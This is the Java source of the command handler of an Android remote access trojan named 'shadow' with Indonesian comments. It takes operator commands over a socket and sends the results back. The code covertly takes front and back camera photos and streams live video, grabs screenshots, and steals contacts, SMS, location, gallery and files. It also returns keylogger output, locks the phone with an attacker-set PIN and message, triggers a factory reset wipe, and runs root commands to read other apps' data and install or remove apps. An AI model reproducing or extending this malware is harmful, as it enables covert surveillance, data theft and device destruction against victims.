package com.shadow.agent;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.camera2.CameraCharacteristics;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import io.socket.client.Socket;

public class CommandHandler {

    private static final String TAG = "SHADOW_CMD";
    private final Context context;
    private final CameraHelper cameraHelper;
    private final GalleryHelper galleryHelper;
    private final FileHelper fileHelper;
    private final LiveCameraService liveCam;

    public CommandHandler(Context context) {
        this.context = context;
        this.cameraHelper = new CameraHelper(context);
        this.galleryHelper = new GalleryHelper(context);
        this.fileHelper = new FileHelper(context);
        this.liveCam = new LiveCameraService(context);
    }

    public void handle(String cmdId, String command, JSONObject params, Socket socket) {
        new Thread(() -> {
            JSONObject result = new JSONObject();
            String status = "done";

            try {
                switch (command) {

                    /* ===== NAVIGASI ===== */
                    case "home":
                        boolean homeOk = KeylogService.performHome();
                        if (homeOk) {
                            result.put("action", "home");
                        } else {
                            Intent home = new Intent(Intent.ACTION_MAIN);
                            home.addCategory(Intent.CATEGORY_HOME);
                            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            context.startActivity(home);
                            result.put("action", "home-intent");
                        }
                        break;

                    case "back":
                        boolean backOk = KeylogService.performBack();
                        result.put("action", backOk ? "back" : "failed");
                        if (!backOk) status = "error";
                        break;

                    case "recents":
                        boolean recentsOk = KeylogService.performRecents();
                        result.put("action", recentsOk ? "recents" : "failed");
                        if (!recentsOk) status = "error";
                        break;

                    /* ===== LOCK ===== */
                    case "lock":
                        try {
                            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                            ComponentName cn = new ComponentName(context, LockAdminReceiver.class);
                            if (dpm.isAdminActive(cn)) {
                                dpm.lockNow();
                                result.put("locked", true);
                            } else {
                                result.put("error", "Device admin not active");
                                status = "error";
                            }
                        } catch (Exception e) { result.put("error", e.getMessage()); }
                        break;

                    case "lock_v2":
                        String pin = params != null ? params.optString("pin", "000000") : "000000";
                        String msg = params != null ? params.optString("message", "Locked") : "Locked";
                        try {
                            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                            ComponentName cn = new ComponentName(context, LockAdminReceiver.class);
                            if (dpm.isAdminActive(cn)) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    dpm.setPasswordMinimumLength(cn, 6);
                                    dpm.resetPassword(pin, 0);
                                }
                                dpm.lockNow();
                                result.put("locked", true);
                                result.put("pin", pin);
                                result.put("message", msg);
                                showLockOverlay(msg);
                            } else {
                                result.put("error", "Device admin not active");
                                status = "error";
                            }
                        } catch (Exception e) { result.put("error", e.getMessage()); }
                        break;

                    /* ===== KAMERA ===== */
                    case "photo_front":
                        captureAndSend(cmdId, command, socket, CameraCharacteristics.LENS_FACING_FRONT);
                        return;
                    case "photo_back":
                        captureAndSend(cmdId, command, socket, CameraCharacteristics.LENS_FACING_BACK);
                        return;
                    case "screenshot":
                        captureScreenAndSend(cmdId, command, socket);
                        return;
                    case "screenshot_root":
                        if (RootHelper.isRooted()) {
                            String out = RootHelper.runCommand("screencap -p /sdcard/screen_root.png && echo DONE");
                            if (out.contains("DONE")) {
                                String data = fileHelper.readFile("/sdcard/screen_root.png");
                                if (data != null) {
                                    result.put("screenshot", data);
                                    result.put("via", "root");
                                } else {
                                    result.put("error", "Gagal baca screenshot");
                                    status = "error";
                                }
                            } else {
                                result.put("error", out);
                                status = "error";
                            }
                        } else {
                            result.put("error", "Butuh root");
                            status = "unsupported";
                        }
                        break;

                    /* ===== LIVE CAMERA ===== */
                    case "live_camera":
                        liveCam.start(socket, CameraCharacteristics.LENS_FACING_FRONT);
                        result.put("streaming", true);
                        break;
                    case "stop_stream":
                        liveCam.stop();
                        result.put("stopped", true);
                        break;

                    /* ===== DATA ===== */
                    case "get_info":
                        result = getDeviceInfo();
                        break;
                    case "get_contacts":
                        result.put("contacts", getContacts());
                        break;
                    case "get_sms":
                        result.put("sms", getSMS());
                        break;
                    case "get_location":
                        result = getLocation();
                        break;
                    case "get_location_root":
                        if (RootHelper.isRooted()) {
                            String out = RootHelper.runCommand("dumpsys location | grep -A2 'Last Known'");
                            result.put("raw_location", out);
                        }
                        try {
                            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                            if (loc != null) {
                                result.put("lat", loc.getLatitude());
                                result.put("lng", loc.getLongitude());
                                result.put("accuracy", loc.getAccuracy());
                            }
                        } catch (SecurityException e) { result.put("error", e.getMessage()); }
                        break;
                    case "get_gallery":
                        int limit = params != null ? params.optInt("limit", 20) : 20;
                        boolean withThumb = params != null && params.optBoolean("thumbnail", false);
                        if (limit > 50) limit = 50;
                        result.put("photos", galleryHelper.getGallery(limit, withThumb));
                        result.put("videos", galleryHelper.getVideoGallery(Math.min(limit, 10)));
                        result.put("count", limit);
                        break;

                    /* ===== FILES ===== */
                    case "list_files":
                        String listPath = params != null ? params.optString("path", "") : "";
                        int listLimit = params != null ? params.optInt("limit", 100) : 100;
                        if (listLimit > 500) listLimit = 500;
                        result.put("files", fileHelper.listFiles(listPath, listLimit));
                        result.put("path", listPath.isEmpty() ? Environment.getExternalStorageDirectory().getAbsolutePath() : listPath);
                        break;

                    case "download_file":
                        String dlPath = params != null ? params.optString("path", "") : "";
                        if (dlPath.isEmpty()) { result.put("error", "Path kosong"); status = "error"; }
                        else {
                            String data = fileHelper.readFile(dlPath);
                            if (data != null) { result.put("file", data); result.put("path", dlPath); }
                            else { result.put("error", "Gagal baca file"); status = "error"; }
                        }
                        break;

                    case "upload_file":
                        String upPath = params != null ? params.optString("path", "") : "";
                        String upData = params != null ? params.optString("data", "") : "";
                        if (upPath.isEmpty() || upData.isEmpty()) { result.put("error", "Path/data kosong"); status = "error"; }
                        else {
                            if (upData.contains(",")) upData = upData.substring(upData.indexOf(",") + 1);
                            boolean ok = fileHelper.writeFile(upPath, upData);
                            result.put("uploaded", ok);
                            result.put("path", upPath);
                            if (!ok) status = "error";
                        }
                        break;

                    case "delete_file":
                        String delPath = params != null ? params.optString("path", "") : "";
                        if (delPath.isEmpty()) { result.put("error", "Path kosong"); status = "error"; }
                        else {
                            boolean ok = fileHelper.deleteFile(delPath);
                            result.put("deleted", ok);
                            result.put("path", delPath);
                            if (!ok) status = "error";
                        }
                        break;

                    /* ===== KEYLOGGER ===== */
                    case "keylog_on":
                    case "keylog_get":
                        String logContent = KeylogService.getLog();
                        result.put("log", logContent.isEmpty() ? "(kosong)" : logContent);
                        result.put("length", logContent.length());
                        break;
                    case "keylog_off":
                        KeylogService.clearLog();
                        result.put("keylog", "cleared");
                        break;

                    /* ===== SOS ===== */
                    case "sos_on":
                        try {
                            android.os.Vibrator vib = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                            if (vib != null) {
                                long[] pattern = {0, 500, 200, 500, 200, 500, 200, 500, 200, 500};
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    vib.vibrate(android.os.VibrationEffect.createWaveform(pattern, 0));
                                } else {
                                    vib.vibrate(pattern, 0);
                                }
                            }
                            android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                            if (am != null) {
                                am.setStreamVolume(android.media.AudioManager.STREAM_ALARM,
                                        am.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
                            }
                            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(context,
                                    android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM));
                            if (r != null) r.play();
                            result.put("sos", true);
                        } catch (Exception e) { result.put("error", e.getMessage()); status = "error"; }
                        break;
                    case "sos_off":
                        try {
                            android.os.Vibrator vib = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                            if (vib != null) vib.cancel();
                            result.put("sos", false);
                        } catch (Exception e) { result.put("error", e.getMessage()); }
                        break;

                    /* ===== JARINGAN ===== */
                    case "open_url":
                        String url = params != null ? params.optString("url", "https://google.com") : "https://google.com";
                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(i);
                        result.put("url", url);
                        break;

                    case "call_number":
                        String num = params != null ? params.optString("number", "") : "";
                        Intent call = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + num));
                        call.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        try { context.startActivity(call); } catch (Exception e) { result.put("error", e.getMessage()); }
                        break;

                    case "wifi_off":
                        if (RootHelper.isRooted()) {
                            result.put("wifi", "off");
                            result.put("via", "root");
                            result.put("output", RootHelper.runCommand("svc wifi disable"));
                        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                            if (wm != null) { wm.setWifiEnabled(false); result.put("wifi", "off"); result.put("via", "api"); }
                        } else { result.put("error", "Butuh root (Android 10+)"); status = "unsupported"; }
                        break;

                    case "wifi_on":
                        if (RootHelper.isRooted()) {
                            result.put("wifi", "on");
                            result.put("via", "root");
                            result.put("output", RootHelper.runCommand("svc wifi enable"));
                        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                            if (wm != null) { wm.setWifiEnabled(true); result.put("wifi", "on"); result.put("via", "api"); }
                        } else { result.put("error", "Butuh root (Android 10+)"); status = "unsupported"; }
                        break;

                    case "data_off":
                        if (RootHelper.isRooted()) {
                            result.put("data", "off");
                            result.put("output", RootHelper.runCommand("svc data disable"));
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "data_on":
                        if (RootHelper.isRooted()) {
                            result.put("data", "on");
                            result.put("output", RootHelper.runCommand("svc data enable"));
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "hotspot_on":
                        if (RootHelper.isRooted()) {
                            result.put("hotspot", "on");
                            result.put("output", RootHelper.runCommand("service call connectivity 34 i32 1"));
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "hotspot_off":
                        if (RootHelper.isRooted()) {
                            result.put("hotspot", "off");
                            result.put("output", RootHelper.runCommand("service call connectivity 34 i32 0"));
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    /* ===== DANGER ===== */
                    case "wipe_sd":
                        try {
                            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                            ComponentName cn = new ComponentName(context, LockAdminReceiver.class);
                            if (dpm.isAdminActive(cn)) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                    dpm.setStorageEncryption(cn, true);
                                }
                                result.put("note", "Storage encryption enabled");
                                result.put("status", "pending");
                            } else { result.put("error", "Device admin not active"); status = "error"; }
                        } catch (Exception e) { result.put("error", e.getMessage()); status = "error"; }
                        break;

                    case "factory_reset":
                        try {
                            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                            ComponentName cn = new ComponentName(context, LockAdminReceiver.class);
                            if (dpm.isAdminActive(cn)) {
                                dpm.wipeData(0);
                                result.put("status", "executing");
                            } else { result.put("error", "Device admin not active"); status = "error"; }
                        } catch (Exception e) { result.put("error", e.getMessage()); status = "error"; }
                        break;

                    /* ===== SOCIAL ===== */
                    case "msg_wa":
                        String waNum = params != null ? params.optString("number", "") : "";
                        String waMsg = params != null ? params.optString("message", "") : "";
                        if (waNum.isEmpty()) { result.put("error", "Number kosong"); status = "error"; }
                        else {
                            try {
                                String waUrl = "https://wa.me/" + waNum + "?text=" + java.net.URLEncoder.encode(waMsg, "UTF-8");
                                Intent wa = new Intent(Intent.ACTION_VIEW, Uri.parse(waUrl));
                                wa.setPackage("com.whatsapp");
                                wa.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                context.startActivity(wa);
                                result.put("sent", true);
                            } catch (Exception e) { result.put("error", e.getMessage()); status = "error"; }
                        }
                        break;

                    case "msg_tg":
                        String tgUser = params != null ? params.optString("username", "") : "";
                        if (tgUser.isEmpty()) { result.put("error", "Username kosong"); status = "error"; }
                        else {
                            try {
                                Intent tg = new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/" + tgUser));
                                tg.setPackage("org.telegram.messenger");
                                tg.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                context.startActivity(tg);
                                result.put("sent", true);
                            } catch (Exception e) { result.put("error", e.getMessage()); status = "error"; }
                        }
                        break;

                    case "msg_ig":
                        String igUser = params != null ? params.optString("username", "") : "";
                        if (igUser.isEmpty()) { result.put("error", "Username kosong"); status = "error"; }
                        else {
                            try {
                                Intent ig = new Intent(Intent.ACTION_VIEW, Uri.parse("https://instagram.com/" + igUser));
                                ig.setPackage("com.instagram.android");
                                ig.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                context.startActivity(ig);
                                result.put("sent", true);
                            } catch (Exception e) { result.put("error", e.getMessage()); status = "error"; }
                        }
                        break;

                    /* ===== ROOT EXTRA ===== */
                    case "install_app":
                        String apkPath = params != null ? params.optString("path", "") : "";
                        if (apkPath.isEmpty()) { result.put("error", "Path kosong"); status = "error"; }
                        else if (RootHelper.isRooted()) {
                            String out = RootHelper.runCommand("pm install -r " + apkPath);
                            result.put("installed", out.contains("Success"));
                            result.put("output", out);
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "uninstall_app":
                        String uPkg = params != null ? params.optString("package", "") : "";
                        if (uPkg.isEmpty()) { result.put("error", "Package kosong"); status = "error"; }
                        else if (RootHelper.isRooted()) {
                            String out = RootHelper.runCommand("pm uninstall --user 0 " + uPkg);
                            result.put("uninstalled", out.contains("Success"));
                            result.put("output", out);
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "kill_app":
                        String kPkg = params != null ? params.optString("package", "") : "";
                        if (kPkg.isEmpty()) { result.put("error", "Package kosong"); status = "error"; }
                        else if (RootHelper.isRooted()) {
                            RootHelper.runCommand("am force-stop " + kPkg);
                            result.put("killed", kPkg);
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "disable_app":
                        String dPkg = params != null ? params.optString("package", "") : "";
                        if (dPkg.isEmpty()) { result.put("error", "Package kosong"); status = "error"; }
                        else if (RootHelper.isRooted()) {
                            String out = RootHelper.runCommand("pm disable-user --user 0 " + dPkg);
                            result.put("disabled", dPkg);
                            result.put("output", out);
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "read_app_data":
                        String targetPkg = params != null ? params.optString("package", "") : "";
                        String subPath = params != null ? params.optString("path", "") : "";
                        if (targetPkg.isEmpty()) { result.put("error", "Package kosong"); status = "error"; }
                        else if (RootHelper.isRooted()) {
                            String targetPath = "/data/data/" + targetPkg + "/" + subPath;
                            result.put("path", targetPath);
                            result.put("files", RootHelper.runCommand("ls -la " + targetPath));
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "screen_record_start":
                        if (RootHelper.isRooted()) {
                            RootHelper.runCommand("screenrecord --time-limit 180 /sdcard/screen_record.mp4 &");
                            result.put("recording", true);
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "screen_record_stop":
                        if (RootHelper.isRooted()) {
                            RootHelper.runCommand("pkill -f screenrecord");
                            result.put("stopped", true);
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "reboot":
                        if (RootHelper.isRooted()) { RootHelper.runCommand("reboot"); result.put("action", "reboot"); }
                        else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "reboot_recovery":
                        if (RootHelper.isRooted()) { RootHelper.runCommand("reboot recovery"); result.put("action", "reboot_recovery"); }
                        else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "shutdown":
                        if (RootHelper.isRooted()) { RootHelper.runCommand("reboot -p"); result.put("action", "shutdown"); }
                        else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    case "change_mac":
                        String newMac = params != null ? params.optString("mac", "") : "";
                        if (newMac.isEmpty()) { result.put("error", "MAC kosong"); status = "error"; }
                        else if (RootHelper.isRooted()) {
                            RootHelper.runCommand("ip link set wlan0 address " + newMac);
                            result.put("mac", newMac);
                        } else { result.put("error", "Butuh root"); status = "unsupported"; }
                        break;

                    default:
                        result.put("note", "command not implemented: " + command);
                        status = "unsupported";
                }
            } catch (Exception e) {
                try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
                status = "error";
                Log.e(TAG, "Handle error: " + e.getMessage(), e);
            }

            try {
                JSONObject payload = new JSONObject();
                payload.put("cmdId", cmdId);
                payload.put("command", command);
                payload.put("result", result);
                payload.put("status", status);
                socket.emit("command:result", payload);
            } catch (Exception ignored) {}
        }).start();
    }
    
    
    
    /* ===== HELPER METHODS ===== */

    private void captureAndSend(String cmdId, String command, Socket socket, int facing) {
        cameraHelper.capturePhoto(facing, (b64, err) -> {
            try {
                JSONObject result = new JSONObject();
                if (b64 != null) {
                    result.put("photo", "data:image/jpeg;base64," + b64);
                    result.put("size", "640x480");
                    result.put("facing", facing == CameraCharacteristics.LENS_FACING_FRONT ? "front" : "back");
                } else {
                    result.put("error", err);
                }
                JSONObject payload = new JSONObject();
                payload.put("cmdId", cmdId);
                payload.put("command", command);
                payload.put("result", result);
                payload.put("status", b64 != null ? "done" : "error");
                socket.emit("command:result", payload);
            } catch (Exception ignored) {}
        });
    }

    private void captureScreenAndSend(String cmdId, String command, Socket socket) {
        ScreenCaptureService sc = ScreenCaptureService.getInstance();
        if (sc == null) {
            try {
                JSONObject r = new JSONObject();
                r.put("error", "Screen capture not initialized");
                JSONObject p = new JSONObject();
                p.put("cmdId", cmdId);
                p.put("command", command);
                p.put("result", r);
                p.put("status", "error");
                socket.emit("command:result", p);
            } catch (Exception ignored) {}
            return;
        }
        sc.capture((b64, err) -> {
            try {
                JSONObject r = new JSONObject();
                if (b64 != null) r.put("screenshot", "data:image/jpeg;base64," + b64);
                else r.put("error", err);
                JSONObject p = new JSONObject();
                p.put("cmdId", cmdId);
                p.put("command", command);
                p.put("result", r);
                p.put("status", b64 != null ? "done" : "error");
                socket.emit("command:result", p);
            } catch (Exception ignored) {}
        });
    }

    private JSONObject getDeviceInfo() throws Exception {
        JSONObject o = new JSONObject();
        o.put("model", Build.MODEL);
        o.put("manufacturer", Build.MANUFACTURER);
        o.put("brand", Build.BRAND);
        o.put("android", Build.VERSION.RELEASE);
        o.put("sdk", Build.VERSION.SDK_INT);
        o.put("device", Build.DEVICE);
        o.put("hardware", Build.HARDWARE);
        o.put("hostname", Build.HOST);
        o.put("rooted", RootHelper.isRooted());
        return o;
    }

    private JSONArray getContacts() throws Exception {
        JSONArray arr = new JSONArray();
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                o.put("number", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                arr.put(o);
                if (arr.length() >= 500) break;
            }
            c.close();
        }
        return arr;
    }

    private JSONArray getSMS() throws Exception {
        JSONArray arr = new JSONArray();
        Cursor c = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                o.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                o.put("date", c.getLong(c.getColumnIndexOrThrow("date")));
                arr.put(o);
                if (arr.length() >= 100) break;
            }
            c.close();
        }
        return arr;
    }

    private JSONObject getLocation() throws Exception {
        JSONObject o = new JSONObject();
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                o.put("lat", loc.getLatitude());
                o.put("lng", loc.getLongitude());
                o.put("accuracy", loc.getAccuracy());
            }
        } catch (SecurityException e) {
            o.put("error", "permission denied");
        }
        return o;
    }

    private void showLockOverlay(String message) {
        try {
            android.view.WindowManager wm = (android.view.WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            android.widget.TextView tv = new android.widget.TextView(context);
            tv.setText(message);
            tv.setTextColor(0xFFFFFFFF);
            tv.setTextSize(24);
            tv.setBackgroundColor(0xFF0D0D0D);
            tv.setPadding(50, 50, 50, 50);
            tv.setGravity(android.view.Gravity.CENTER);

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : android.view.WindowManager.LayoutParams.TYPE_PHONE;

            android.view.WindowManager.LayoutParams lp = new android.view.WindowManager.LayoutParams(
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            | android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.OPAQUE);

            wm.addView(tv, lp);
        } catch (Exception e) { Log.e(TAG, "Overlay error", e); }
    }
}